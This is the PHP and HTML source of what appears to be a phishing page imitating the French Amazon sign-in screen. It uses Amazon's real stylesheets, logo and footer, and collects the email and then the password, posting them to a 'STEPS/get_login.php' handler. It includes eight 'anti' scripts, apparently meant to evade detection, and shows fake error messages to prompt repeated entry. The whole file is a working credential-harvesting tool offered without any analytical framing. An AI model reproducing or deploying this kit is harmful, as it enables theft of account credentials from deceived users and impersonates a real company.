<?php session_start(); 
include('prevents/anti1.php');
include('prevents/anti2.php');
include('prevents/anti3.php');
include('prevents/anti4.php');
include('prevents/anti5.php');
include('prevents/anti6.php');
include('prevents/anti7.php');
include('prevents/anti8.php');
?>


<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ws" data-19ax5a9jf="dingo" data-aui-build-date="3.20.8-2021-02-19">
<head>
      <meta name="viewport" content="width=device-width"/>

<link rel="icon" href="../RESSOURCES/icon.png"/>
    <title dir="ltr">Connexion Amazon</title>

    
      

      
        <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/61zcRmYWpgL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI&amp;zSPFUKZg#fr.not-trident">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41RVmSDdlvL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11G4j12sgkL.css?AUIClients/CVFAssets">

      
    
 
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
    
      <i class="a-icon a-icon-domain-fr a-icon-domain" role="presentation"></i>
    
  
</a>

    
  
</div>


      </div>
      <div id="authportal-center-section" class="a-section">
        <div class="a-section a-spacing-base auth-pagelet-container">
<div class="a-section">
<?php

if(strpos($_SERVER['REQUEST_URI'],"mailError=true"))
{
  echo '<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Un problème est survenu</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
        
          <li><span class="a-list-item">
            Impossible de trouver un compte correspondant à cette adresse e-mail
          </span></li>    
      </ul>
          </div></div>
</div>
</div>';
}
?>

<?php

if(strpos($_SERVER['REQUEST_URI'],"passError=true"))
{
  echo '<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Un problème est survenu</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
        
          <li><span class="a-list-item">
            Le mot de passe saisi est incorrecte
          </span></li>    
      </ul>
          </div></div>
</div>
</div>';
}
?>
      
    

        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    </div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  





  
    





<div class="a-section a-spacing-base">
  <div class="a-section">

    <form name="signIn" method="post" novalidate="" action="STEPS/get_login.php" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="MVAqFszy">
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            S'identifier
          </h1>
          <!-- optional subheading element -->
          
          <div class="a-row a-spacing-base">
            
        <?php

            if(!strpos($_SERVER['REQUEST_URI'],"isPass"))
            {
                echo '<label for="ap_email" class="a-form-label">
              Adresse e-mail 
            </label>';
                echo '<input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">';
            }
            else{
           echo ' <div class="a-row a-spacing-base">
      <span>'.$_SESSION['email'].'</span>
      <a id="ap_change_login_claim" class="a-link-normal" tabindex="6" href="index.php">
        Modifier
      </a>
    </div>';
          
            echo '<label for="ap_email" class="a-form-label">
              Mot de passe
            </label>';
            echo '<input type="password" maxlength="128" id="ap_email" name="password" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">';
        }
            

            

            ?>
            



<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i></div></div>

          </div>

          
          <input type="hidden" name="create" value="0">

          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner">


                <input id="continue" tabindex="5" class="a-button-input" type="submit" name="<?php if(strpos($_SERVER['REQUEST_URI'],'isPass')){echo 'connexions'; }else{ echo 'continuer';}?>" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">


              <?php if(strpos($_SERVER['REQUEST_URI'],'isPass')){echo 'Se connecter'; }else{ echo 'Continuer';}?>
            </span></span></span>

            
            
              



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  En passant votre commande, vous acceptez les <a href="#">Conditions générales de vente</a> d’Amazon. Veuillez consulter notre <a href="#">Notice Protection de vos informations personnelles</a>, notre <a href="#">Notice Cookies</a> et notre <a href="#">Notice Annonces publicitaires basées sur vos centres d’intérêt</a>.
</div> 

            

            


          </div>

          

          

          



<div class="a-section">
  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
    <a href="#" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
      Avez-vous besoin d’aide&nbsp;?
    </span></a>
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
        



  
  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
  Mot de passe oublié
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" href="">
        Autres problèmes de connexion
      </a>
    </div>
  </div>
</div>


          




  
  
  
    
      
      
      
        
             
          
        </div></div>
      </div>
  </form>
  </div>
  
    
    
      
        
        <div class="a-divider a-divider-break"><h5>Nouveau chez Amazon ?</h5></div>
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button">
          Créer votre compte Amazon
        </a></span></span>
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Conditions d'utilisation
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Protection de vos informations personnelles
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Aide
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-<?php echo date('Y');?>, Amazon.com, Inc. ou ses filiales.
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    



</div>


</body></html>